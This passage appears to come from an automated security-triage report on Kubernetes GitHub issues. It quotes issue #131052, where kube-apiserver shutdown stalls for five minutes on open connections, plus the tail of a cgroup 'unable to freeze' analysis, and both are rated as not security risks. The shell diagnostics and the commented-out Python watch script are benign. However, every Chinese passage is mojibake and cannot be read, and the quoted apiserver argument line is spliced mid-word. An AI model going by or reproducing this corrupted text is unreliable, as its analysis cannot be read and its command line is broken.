    *   **é—®é¢˜æ€§è´¨**: è¯¥é”™è¯¯å¯¼è‡´ Pod æ— æ³•å¯åŠ¨ã€‚è¿™æ˜¯ä¸€ä¸ª**åŠŸèƒ½æ€§é—®é¢˜**æˆ–**å¯é æ€§é—®é¢˜**ï¼Œè€Œä¸æ˜¯å…¸å‹çš„å®‰å…¨æ¼æ´ã€‚å®ƒé˜»æ­¢äº†æœåŠ¡çš„æ­£å¸¸è¿è¡Œï¼Œä½†å¹¶æœªç›´æ¥å¯¼è‡´æ•°æ®æ³„éœ²ã€æƒé™æå‡ã€è¿œç¨‹ä»£ç æ‰§è¡Œæˆ–å®¹å™¨é€ƒé€¸ã€‚
    *   **æ‹’ç»æœåŠ¡ (DoS)**: è™½ç„¶ Pod å¯åŠ¨å¤±è´¥å¯ä»¥çœ‹ä½œæ˜¯ä¸€ç§å±€éƒ¨ DoSï¼ˆè¯¥ Pod æ— æ³•æä¾›æœåŠ¡ï¼‰ï¼Œä½†å®ƒä¼¼ä¹æ˜¯è¿è¡Œæ—¶æˆ–å†…æ ¸å±‚é¢çš„é—´æ­‡æ€§æ•…éšœï¼Œè€Œä¸æ˜¯æ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šè¯·æ±‚ç¨³å®šè§¦å‘çš„æ¼æ´ã€‚æ ¹æ® Issue æè¿°ï¼Œç”¨æˆ·è‡ªå·±ä¹Ÿæ— æ³•ç¨³å®šå¤ç°ã€‚å³ä½¿æ”»å‡»è€…æœ‰æƒé™åˆ›å»º Podï¼Œä¹Ÿéš¾ä»¥åˆ©ç”¨æ­¤é—®é¢˜æ¥å¯é åœ°ç˜«ç—ªèŠ‚ç‚¹æˆ–å…¶ä»–æœåŠ¡ã€‚æ ¹æ®æ ‡å‡† #5ï¼Œå³ä½¿å­˜åœ¨ DoS å¯èƒ½ï¼Œåˆ©ç”¨ä¹Ÿéœ€è¦åˆ›å»º Pod çš„æƒé™ï¼Œä¸”æ•ˆæœä¸ç¨³å®šã€å½±å“èŒƒå›´æœ‰é™ï¼ˆå•ä¸ª Pod å¯åŠ¨å¤±è´¥ï¼‰ï¼Œä¸åº”åˆ¤å®šä¸ºé«˜é£é™©ã€‚
    *   **ä¿¡æ¯æ³„éœ²**: Issue å†…å®¹åŒ…å«äº†ä¸€äº›ç¯å¢ƒä¿¡æ¯ï¼ˆç‰ˆæœ¬å·ã€AMI IDã€éƒ¨åˆ†å†…ç½‘ IPï¼‰ï¼Œè¿™æ˜¯ç”¨æˆ·ä¸ºäº†æŠ¥å‘Šé—®é¢˜è€Œä¸»åŠ¨æä¾›çš„ï¼Œå¹¶éç”±è½¯ä»¶æ¼æ´å¯¼è‡´æ³„éœ²ã€‚é”™è¯¯æ—¥å¿—æœ¬èº«ä¸åŒ…å«æ•æ„Ÿå‡­è¯ä¿¡æ¯ã€‚ç¬¦åˆæ ‡å‡† #4ã€‚
    *   **å‘½ä»¤æ‰§è¡Œ/ææƒ/å®¹å™¨é€ƒé€¸**: é”™è¯¯å‘ç”Ÿåœ¨å®¹å™¨å¯åŠ¨çš„æ—©æœŸé˜¶æ®µï¼ˆ`runc create` -> `container init` -> `setting cgroup config for procHooks process`ï¼‰ï¼Œåœ¨ç”¨æˆ·å®šä¹‰çš„å®¹å™¨è¿›ç¨‹å®é™…è¿è¡Œä¹‹å‰ã€‚å¤±è´¥å¯¼è‡´å®¹å™¨å¯åŠ¨ä¸­æ­¢ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜æ­¤å¤±è´¥è·¯å¾„å¯ä»¥è¢«åˆ©ç”¨æ¥æ‰§è¡Œéé¢„æœŸä»£ç æˆ–çªç ´å®¹å™¨éš”ç¦»ã€‚ä¸æ¶‰åŠæ ‡å‡† #7ã€‚
    *   **å¤šç§Ÿæˆ·å½±å“**: ä¸€ä¸ªç”¨æˆ·ï¼ˆæˆ–ç§Ÿæˆ·ï¼‰çš„ Pod å¯åŠ¨å¤±è´¥ï¼Œä¸»è¦å½±å“è¯¥ç”¨æˆ·è‡ªèº«çš„å·¥ä½œè´Ÿè½½ã€‚è™½ç„¶é¢‘ç¹å¤±è´¥å¯èƒ½æ¶ˆè€—å°‘é‡è°ƒåº¦å™¨å’Œ Kubelet èµ„æºï¼Œä½†æ²¡æœ‰è¿¹è±¡è¡¨æ˜ä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯ä»¥åˆ©ç”¨æ­¤é—®é¢˜ç›´æ¥å½±å“å…¶ä»–ç”¨æˆ·ï¼ˆæˆ–å…¶ä»–ç§Ÿæˆ·ï¼‰çš„è¿è¡Œä¸­å®¹å™¨æˆ–æ•°æ®ã€‚ä¸æ¶‰åŠæ ‡å‡† #8ã€‚
    *   **å‡­æ®æ³„éœ² (æ—¥å¿—)**: Issue ä¸­æœªæåŠæ—¥å¿—æ³„éœ²å‡­æ®çš„é—®é¢˜ã€‚ä¸æ¶‰åŠæ ‡å‡† #6ã€‚
4.  **ç»“è®º**: è¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªå®¹å™¨è¿è¡Œæ—¶å±‚é¢çš„é—´æ­‡æ€§æ•…éšœï¼Œå¯¼è‡´ç‰¹å®š Pod å¯åŠ¨å¤±è´¥ã€‚è™½ç„¶å½±å“äº†æœåŠ¡çš„å¯ç”¨æ€§ï¼Œä½†æ ¹æ®æ‰€æä¾›çš„ä¿¡æ¯å’Œé£é™©åˆ¤æ–­æ ‡å‡†ï¼Œå®ƒä¸æ„æˆä¸€ä¸ªå¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚å…¶æ ¹æœ¬åŸå› æ›´å¯èƒ½åœ¨äºå†…æ ¸ã€cgroup å®ç°æˆ– runc/containerd çš„ bug/race conditionï¼Œå°¤å…¶åœ¨æœªæŒ‡å®šèµ„æºè¯·æ±‚æ—¶å¯èƒ½æ›´å®¹æ˜“è§¦å‘ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# Issue éå®‰å…¨é£é™©ï¼Œæ— éœ€ POC è„šæœ¬
# è¯¥é—®é¢˜æè¿°äº†ä¸€ä¸ªå¶å‘çš„ã€éš¾ä»¥å¤ç°çš„å®¹å™¨å¯åŠ¨å¤±è´¥é”™è¯¯ï¼Œä¸å†…æ ¸/cgroup/runc/containerd çš„å†…éƒ¨çŠ¶æ€æˆ–ç«äº‰æ¡ä»¶ç›¸å…³ã€‚
# è¿™ç±»é—®é¢˜é€šå¸¸ä¸è¢«è§†ä¸ºå®‰å…¨æ¼æ´ï¼Œè€Œæ˜¯åŠŸèƒ½æ€§æˆ–ç¨³å®šæ€§é—®é¢˜ã€‚
# æ— æ³•ç¼–å†™ä¸€ä¸ªç¡®å®šæ€§çš„ POC æ¥è§¦å‘æ­¤å®‰å…¨é£é™©ï¼Œå› ä¸ºå®ƒæœ¬èº«ä¸è¢«åˆ¤å®šä¸ºå®‰å…¨é£é™©ã€‚
# åŒæ—¶ï¼Œæ ¹æ® Issue æè¿°ï¼Œç”¨æˆ·ä¹Ÿæ— æ³•ç¨³å®šå¤ç°è¯¥åŠŸèƒ½æ€§é—®é¢˜ã€‚
pass
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æŠ¥å‘Šäº†ä¸€ä¸ªåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼ˆEKS ç¯å¢ƒã€ç‰¹å®šå†…æ ¸/containerd ç‰ˆæœ¬ã€æ— èµ„æºè¯·æ±‚çš„ Podï¼‰å¶å‘çš„å®¹å™¨å¯åŠ¨å¤±è´¥é”™è¯¯ `unable to freeze`ã€‚åˆ†æè¡¨æ˜ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸åº•å±‚å®¹å™¨è¿è¡Œæ—¶ï¼ˆruncï¼‰ã€å®¹å™¨ç®¡ç†å™¨ï¼ˆcontainerdï¼‰å’Œ Linux å†…æ ¸ cgroup å­ç³»ç»Ÿäº¤äº’ç›¸å…³çš„**åŠŸèƒ½æ€§æˆ–ç¨³å®šæ€§é—®é¢˜**ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å®ƒæ²¡æœ‰æä¾›å¯åˆ©ç”¨çš„æ”»å‡»å‘é‡æ¥å®ç°æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²ã€å‘½ä»¤æ‰§è¡Œæˆ–å¯é çš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚ç”±äºé—®é¢˜å¹¶éå®‰å…¨é£é™©ï¼Œä¸”æ ¹æ®æè¿°æœ¬èº«å°±éš¾ä»¥å¤ç°ï¼Œå› æ­¤ä¸æä¾›å¤ç°è„šæœ¬ï¼ˆPOCï¼‰ã€‚æä¾›çš„ Python ä»£ç å—ä¸ºç©ºï¼Œå¹¶æ³¨é‡Šè¯´æ˜äº†åŸå› ã€‚

---


## Issue #131052 kube-apiserver cannot be gracefully terminated

- Issue é“¾æ¥ï¼š[#131052](https://github.com/kubernetes/kubernetes/issues/131052)

### Issue å†…å®¹

#### What happened?

Currently, it seems that a few things may not work as expected when it comes to the `kube-apiserver` graceful termination, which can lead to a long shutdown period of the service:

```
Mar 25 09:53:35 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:35.510487 1210852 genericapiserver.go:690] [graceful-termination] waiting for shutdown to be initiated
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.838659 1210852 genericapiserver.go:548] "[graceful-termination] shutdown event" name="ShutdownInitiated"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.838688 1210852 genericapiserver.go:551] "[graceful-termination] shutdown event" name="AfterShutdownDelayDuration"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882707 1210852 genericapiserver.go:699] "[graceful-termination] pre-shutdown hooks completed" name="PreShutdownHooksStopped"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882730 1210852 genericapiserver.go:622] "[graceful-termination] shutdown event" name="NotAcceptingNewRequest"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882800 1210852 genericapiserver.go:656] "[graceful-termination] not going to wait for active watch request(s) to drain"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882845 1210852 genericapiserver.go:647] [graceful-termination] in-flight non long-running request(s) have drained
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882872 1210852 genericapiserver.go:688] "[graceful-termination] shutdown event" name="InFlightRequestsDrained"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.883779 1210852 genericapiserver.go:605] "[graceful-termination] shutdown event" name="HTTPServerStoppedListening"
Mar 25 09:58:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:58:50.884685 1210852 genericapiserver.go:722] [graceful-termination] apiserver is exiting
```

Note the 5 minute gap between the last 2 lines. That time is spent trying to shutdown the server (https://github.com/kubernetes/kubernetes/blob/ff25881bc1fe9da1dda4ec82d294b92078ae2763/staging/src/k8s.io/apiserver/pkg/server/secure_serving.go#L236-L238), and after 5 minutes it times out.

`kube-apiserver` is running with the following arguments:

```
/snap/k8s/x1/bin/kube-apiserver --advertise-addrescommon/args/conf.d/auth-token-webhook.conf --authorization-mode=Node,RBAC --client-ca-file=/etc/kubernetes/pki/clientite.sock --feature-gates=WatchList=false --kubelet-certificate-authority=/etc/kubernetes/pki/ca.crt --kubelet-client-client.key --kubelet-preferred-address-types=InternalIP,Hostname,InternalDNS,ExternalDNS,ExternalIP --profiling=falseroxy-client.key --request-timeout=300s --requestheader-allowed-names=front-proxy-client --requestheader-client-ca-filers=X-Remote-Group --requestheader-username-headers=X-Remote-User --secure-port=6443 --service-account-issuer=https:/file=/etc/kubernetes/pki/serviceaccount.key --service-cluster-ip-range=10.152.183.0/24 --tls-cert-file=/etc/kuberneteS_128_GCM_SHA256,TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_EA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_ECDHE__256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_RSA_WITH_3DES_ED_GCM_SHA384 --tls-min-version=VersionTLS12 --tls-private-key-file=/etc/kubernetes/pki/apiserver.key --v 5
```

Note the set ``--shutdown-delay-duration=0s`` and  ``--shutdown-watch-termination-grace-period=0s`` arguments, so there shouldn't be any "time to delay the termination", or "grace period the apiserver will wait for active watch request(s) to drain during the graceful server shutdown window" (https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/).

The ``http.server.Shutdown`` mentioned above will try to gracefully shut down the server, without interrupting any active connections (https://pkg.go.dev/net/http#Server.Shutdown). Basically, the operation times out because there are still active connections to the server. This can be replicated by starting the `kube-apiserver` and creating a watch request:

```
sudo systemctl start snap.k8s.kube-apiserver.service
sleep 5  # allow the apiserver to properly start.
kubectl get --watch nodes &
sudo systemctl stop snap.k8s.kube-apiserver.service  # This will now hang for 5 minutes (or maximum timeout set in the systemd unit).
```

The `kube-apiserver` service is immediately stopped, once the watch request is killed (assuming no other connection blocks the server from shutting down, see below).

Other kubernetes services may prevent `kube-apiserver` from shutting down as well. For example, if `kube-scheduler` is running, it will prevent `kube-apiserver` from stopping:

```
sudo netstat -apon | grep 6443 | sort
tcp        0      0 127.0.0.1:35344         127.0.0.1:6443          ESTABLISHED 1211870/kube-schedu  keepalive (23.36/0/0)
tcp        0      0 127.0.0.1:35356         127.0.0.1:6443          ESTABLISHED 1211870/kube-schedu  keepalive (23.36/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:35344         ESTABLISHED 1212449/kube-apiser  keepalive (33.42/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:35356         ESTABLISHED 1212449/kube-apiser  keepalive (33.44/0/0)
```

In this case, stopping `kube-scheduler` will allow `kube-apiserver` to gracefully shutdown. There are other Kubernetes components which may prevent `kube-apiserver` from shutting down:

```
sudo netstat -apon | grep 6443 | sort
tcp        0      0 127.0.0.1:44298         127.0.0.1:6443          ESTABLISHED 1212949/cilium-oper  keepalive (17.12/0/0)
tcp        0      0 127.0.0.1:48248         127.0.0.1:6443          ESTABLISHED 1212949/cilium-oper  keepalive (0.43/0/0)
tcp        0      0 127.0.0.1:48278         127.0.0.1:6443          ESTABLISHED 1213345/cilium-agen  keepalive (6.24/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:44298         ESTABLISHED 1212559/kube-apiser  keepalive (17.06/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:48248         ESTABLISHED 1212559/kube-apiser  keepalive (0.37/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:48278         ESTABLISHED 1212559/kube-apiser  keepalive (6.22/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.157:43478        ESTABLISHED 1212559/kube-apiser  keepalive (18.34/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.17:59620         ESTABLISHED 1212559/kube-apiser  keepalive (19.02/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.47:43156         ESTABLISHED 1212559/kube-apiser  keepalive (20.38/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.75:49452         ESTABLISHED 1212559/kube-apiser  keepalive (20.06/0/0)
```

Above, we can see that `cilium-operator` and `cilium-agent` are connected to the Kubernetes API. Killing them however won't resolve the issue:

```
sudo kill -9 1212949 1213345
sudo netstat -apon | grep 6443 | sort
tcp6       0      0 172.26.39.150:6443      10.1.0.157:43478        ESTABLISHED 1212559/kube-apiser  keepalive (87.81/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.17:59620         ESTABLISHED 1212559/kube-apiser  keepalive (88.87/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.47:43156         ESTABLISHED 1212559/kube-apiser  keepalive (67.18/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.75:49452         ESTABLISHED 1212559/kube-apiser  keepalive (89.77/0/0)
```

Now, what prevents the `kube-apiserver` from gracefully shutting down is its own connections to various Kubernetes Pods: 

```
kubectl  get pods -A -o wide
NAMESPACE     NAME                                  READY   STATUS    RESTARTS       AGE     IP              NODE     NOMINATED NODE   READINESS GATES
kube-system   cilium-frwvf                          1/1     Running   4 (3h5m ago)   3h21m   172.26.39.150   ubuntu   <none>           <none>
kube-system   cilium-operator-586c9984f4-sjc9t      1/1     Running   7 (3h6m ago)   3h21m   172.26.39.150   ubuntu   <none>           <none>
kube-system   ck-storage-rawfile-csi-controller-0   2/2     Running   2 (164m ago)   3h21m   10.1.0.47       ubuntu   <none>           <none>
kube-system   ck-storage-rawfile-csi-node-9fjpm     4/4     Running   8 (164m ago)   3h21m   10.1.0.75       ubuntu   <none>           <none>
kube-system   coredns-57df9874df-8mpdq              1/1     Running   1 (165m ago)   3h21m   10.1.0.17       ubuntu   <none>           <none>
kube-system   metrics-server-8694c96fb7-fcdmd       1/1     Running   1 (164m ago)   3h21m   10.1.0.157      ubuntu   <none>           <none>
```

After killing the containers, ``kube-apiserver`` is allowed to shutdown gracefully.

```
for taskid in `sudo ctr --namespace k8s.io task ls | awk '{print $1}' | tail -n+2`; do sudo ctr --namespace k8s.io task kill --signal SIGKILL $taskid; done
sudo netstat -apon | grep 6443 | sort  # outputs nothing, 
```


#### What did you expect to happen?

Watch requests should't prevent `kube-apiserver`'s graceful termination. `kube-apiserver` should terminate its connections to other Kubernetes-related components when shutting down (coredns, metrics-server, etc.).

#### How can we reproduce it (as minimally and precisely as possible)?

See examples above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
kubectl version
Client Version: v1.30.11
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.32.2
```

</details>


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
PRETTY_NAME="Ubuntu 24.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.1 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo

# paste output here
$ uname -a
# paste output here
Linux ubuntu 6.8.0-52-generic #53-Ubuntu SMP PREEMPT_DYNAMIC Sat Jan 11 00:06:25 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```
</details>


#### Install tools

<details>
k8s snap
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueæè¿°**: è¯¥Issueæè¿°äº†`kube-apiserver`åœ¨å…³é—­æ—¶æ— æ³•ä¼˜é›…ç»ˆæ­¢ï¼ˆgraceful terminationï¼‰çš„é—®é¢˜ã€‚å…·ä½“è¡¨ç°ä¸ºï¼Œå³ä½¿è®¾ç½®äº†`--shutdown-delay-duration=0s`å’Œ`--shutdown-watch-termination-grace-period=0s`ï¼Œ`kube-apiserver`åœ¨æ”¶åˆ°åœæ­¢ä¿¡å·åï¼Œä»ä¼šç­‰å¾…é•¿è¾¾5åˆ†é’Ÿæ‰æœ€ç»ˆé€€å‡ºã€‚
2.  **åŸå› åˆ†æ**: Issueæäº¤è€…é€šè¿‡æ—¥å¿—å’Œå®éªŒåˆ†æï¼ŒæŒ‡å‡ºæ ¹æœ¬åŸå› åœ¨äºGoè¯­è¨€æ ‡å‡†åº“`net/http`çš„`Server.Shutdown`æ–¹æ³•ä¼šç­‰å¾…æ‰€æœ‰æ´»åŠ¨è¿æ¥å…³é—­ã€‚åœ¨Kubernetesåœºæ™¯ä¸‹ï¼Œè¿™äº›æ´»åŠ¨è¿æ¥åŒ…æ‹¬ï¼š
    *   ç”¨æˆ·æˆ–å®¢æˆ·ç«¯ï¼ˆå¦‚`kubectl watch`ï¼‰å‘èµ·çš„é•¿è¿æ¥ï¼ˆWatchè¯·æ±‚ï¼‰ã€‚
    *   å…¶ä»–Kubernetesæ ¸å¿ƒç»„ä»¶ï¼ˆå¦‚`kube-scheduler`, CNIæ’ä»¶å¦‚`cilium-operator`, `cilium-agent`ï¼‰ä¸`kube-apiserver`å»ºç«‹çš„è¿æ¥ã€‚
    *   `kube-apiserver`è‡ªèº«ä¸å…¶ä»–ç»„ä»¶ï¼ˆå¦‚CoreDNS, metrics-serverç­‰Podï¼‰å»ºç«‹çš„è¿æ¥ã€‚
    åªè¦è¿™äº›è¿æ¥å­˜åœ¨ï¼Œ`Server.Shutdown`å°±ä¼šç­‰å¾…ï¼Œç›´åˆ°è¶…æ—¶ï¼ˆé»˜è®¤æˆ–é…ç½®çš„è¶…æ—¶æ—¶é—´ï¼Œæ­¤å¤„è¡¨ç°ä¸º5åˆ†é’Ÿï¼‰å¼ºåˆ¶å…³é—­ã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**:
    *   **é—®é¢˜æ€§è´¨**: è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯æœåŠ¡å¯ç”¨æ€§é—®é¢˜ï¼Œå½±å“çš„æ˜¯`kube-apiserver`çš„å…³é—­é€Ÿåº¦ï¼Œä¸»è¦åœ¨ç»´æŠ¤ã€å‡çº§æˆ–é‡å¯åœºæ™¯ä¸‹é€ æˆå»¶è¿Ÿã€‚å®ƒä¸æ¶‰åŠæœªç»æˆæƒçš„è®¿é—®ã€æ•°æ®æ³„éœ²ã€æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œæˆ–å®¹å™¨é€ƒé€¸ç­‰å…¸å‹å®‰å…¨æ¼æ´ã€‚
    *   **æ”»å‡»å‘é‡**: ç†è®ºä¸Šï¼Œä¸€ä¸ªæ‹¥æœ‰`watch`æƒé™çš„ä½æƒé™ç”¨æˆ·å¯ä»¥é€šè¿‡å»ºç«‹ä¸€ä¸ªæŒä¹…çš„`watch`è¿æ¥æ¥æ•…æ„å»¶é•¿`kube-apiserver`çš„å…³é—­æ—¶é—´ã€‚ç„¶è€Œï¼Œè¿™ä»…ä»…æ˜¯å»¶é•¿äº†å…³é—­è¿‡ç¨‹ï¼Œå¹¶ä¸ä¼šé˜»æ­¢ç®¡ç†å‘˜æœ€ç»ˆå¼ºåˆ¶åœæ­¢æœåŠ¡ï¼ˆä¾‹å¦‚é€šè¿‡`SIGKILL`æˆ–ç­‰å¾…systemdè¶…æ—¶ï¼‰ã€‚
    *   **å½±å“**: ä¸»è¦å½±å“æ˜¯è¿ç»´æ•ˆç‡ã€‚åœ¨éœ€è¦å¿«é€Ÿé‡å¯`kube-apiserver`çš„åœºæ™¯ï¼ˆå¦‚æ»šåŠ¨æ›´æ–°ã€ç´§æ€¥ä¿®å¤éƒ¨ç½²ï¼‰ä¸‹ï¼Œè¿™ä¸ªå»¶è¿Ÿå¯èƒ½ä¼šå½±å“é›†ç¾¤çš„æ•´ä½“æ¢å¤æ—¶é—´ã€‚ä½†è¿™å¹¶ä¸ç›´æ¥å¯¼è‡´å®‰å…¨é£é™©ã€‚
    *   **æƒé™è¦æ±‚**: åˆ©ç”¨æ­¤é—®é¢˜ï¼ˆå»¶é•¿å…³é—­æ—¶é—´ï¼‰éœ€è¦è‡³å°‘å…·æœ‰å¯¹æŸäº›èµ„æºçš„`watch`æƒé™ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼Œæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰å¦‚æœéœ€è¦æ”»å‡»è€…å…·å¤‡ä¸€å®šæƒé™ï¼ˆå³ä½¿æ˜¯åªè¯»çš„watchæƒé™ï¼‰ï¼Œä¹Ÿéœ€è¦è§†æƒ…å†µé™çº§å¤„ç†ã€‚æ­¤å¤„çš„DoSå½±å“ä»…é™äºå…³é—­è¿‡ç¨‹ï¼Œä¸”éœ€è¦æƒé™ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
    *   **ä¸å…¶ä»–æ ‡å‡†å¯¹æ¯”**: å¯¹æ¯”æ ‡å‡†ä¸­çš„é«˜é£é™©åœºæ™¯ï¼ˆå‘½ä»¤æ‰§è¡Œã€ææƒã€å¤šç”¨æˆ·å½±å“ã€æ—¥å¿—å‡­æ®æ³„éœ²ç­‰ï¼‰ï¼Œæ­¤é—®é¢˜å‡ä¸ç¬¦åˆã€‚
    *   **ç»“è®º**: è¯¥é—®é¢˜æ˜¯ä¸€ä¸ªåŠŸèƒ½ç¼ºé™·æˆ–è®¾è®¡é™åˆ¶ï¼Œå¯¼è‡´åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼ˆå­˜åœ¨é•¿è¿æ¥ï¼‰å…³é—­å»¶è¿Ÿï¼Œå½±å“è¿ç»´æ•ˆç‡ï¼Œä½†ä¸æ„æˆå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æœ¬ Issue è¢«åˆ¤å®šä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ï¼Œä¸»è¦æ˜¯ä¸€ä¸ªå½±å“è¿ç»´æ•ˆç‡çš„åŠŸèƒ½æ€§é—®é¢˜ã€‚
# æ ¹æ®è¦æ±‚ï¼Œä»…é’ˆå¯¹é«˜é£é™©é—®é¢˜æä¾›å¤ç°POCã€‚
# å› æ­¤ï¼Œæ­¤å¤„ä¸æä¾›å¤ç°è„šæœ¬ã€‚

# ä»¥ä¸‹æ³¨é‡Šä»£ç æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ Python Kubernetes å®¢æˆ·ç«¯å»ºç«‹ä¸€ä¸ª watch è¿æ¥ï¼Œ
# æ¨¡æ‹Ÿ Issue ä¸­æåˆ°çš„ `kubectl watch` è¡Œä¸ºï¼Œç†è®ºä¸Šå¯ä»¥è§¦å‘å»¶è¿Ÿå…³é—­ã€‚
# ä½†è¯·æ³¨æ„ï¼Œè¿™åªæ˜¯æ¨¡æ‹Ÿå®¢æˆ·ç«¯è¡Œä¸ºï¼Œå¹¶ä¸èƒ½ç›´æ¥å¤ç°æœåŠ¡ç«¯ä»£ç å±‚é¢çš„å…³é—­é€»è¾‘é—®é¢˜ã€‚

"""
import time
import threading
import logging
from kubernetes import client, config, watch

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# å‡è®¾ kubeconfig æ–‡ä»¶ä½äºé»˜è®¤ä½ç½® ~/.kube/config
try:
    config.load_kube_config()
    logging.info("kubeconfig loaded successfully.")
except Exception as e:
    logging.error(f"Failed to load kubeconfig: {e}")
    # åœ¨æ— æ³•åŠ è½½é…ç½®æ—¶é€€å‡ºï¼Œå› ä¸ºæ— æ³•è¿æ¥é›†ç¾¤
    exit(1)

# åˆ›å»º API å®¢æˆ·ç«¯å®ä¾‹
v1 = client.CoreV1Api()

# è®¾ç½®ä¸€ä¸ªæ ‡è®°æ¥æ§åˆ¶ watch çº¿ç¨‹
stop_watch = threading.Event()

def watch_nodes():
    w = watch.Watch()
    try:
        # å°è¯•ç›‘å¬ nodes äº‹ä»¶ï¼Œè®¾ç½®è¾ƒé•¿çš„è¶…æ—¶æ—¶é—´æ¨¡æ‹ŸæŒä¹…è¿æ¥
        # stream() ä¼šé˜»å¡ï¼Œç›´åˆ°è¶…æ—¶æˆ–è¿æ¥è¢«æœåŠ¡å™¨å…³é—­æˆ–æ‰‹åŠ¨åœæ­¢
        logging.info("Starting to watch node events...")
        # ä½¿ç”¨ _request_timeout è®¾ç½® HTTP è¯·æ±‚æœ¬èº«çš„è¶…æ—¶
        # ä½¿ç”¨ timeout_seconds æ§åˆ¶ watch stream çš„æ•´ä½“æŒç»­æ—¶é—´
        # è¿™é‡Œè®¾ç½®ä¸º None æˆ–ä¸€ä¸ªå¾ˆå¤§çš„å€¼æ¥æ¨¡æ‹ŸæŒä¹… watch
        # æ³¨æ„ï¼šå®é™…çš„è¿æ¥ç»´æŒæ—¶é—´è¿˜å— apiserver é…ç½®å’Œç½‘ç»œå› ç´ å½±å“
        for event in w.stream(v1.list_node, _request_timeout=None, timeout_seconds=None):
            # ç®€å•æ‰“å°äº‹ä»¶ç±»å‹å’Œå¯¹è±¡åç§°
            # logging.info(f"Event: {event['type']} Node: {event['object'].metadata.name}")

            # æ£€æŸ¥æ˜¯å¦éœ€è¦åœæ­¢ watch
            if stop_watch.is_set():
                logging.info("Stop signal received, stopping watch.")
                w.stop()
                break
    except client.ApiException as e:
        if stop_watch.is_set():
            logging.info("Watch stopped due to external signal.")
        elif "timed out" in str(e).lower():
            logging.warning("Watch connection timed out.")
        else:
            logging.error(f"API Error during watch: {e}")
    except Exception as e:
        if not stop_watch.is_set():
            logging.error(f"An unexpected error occurred during watch: {e}")
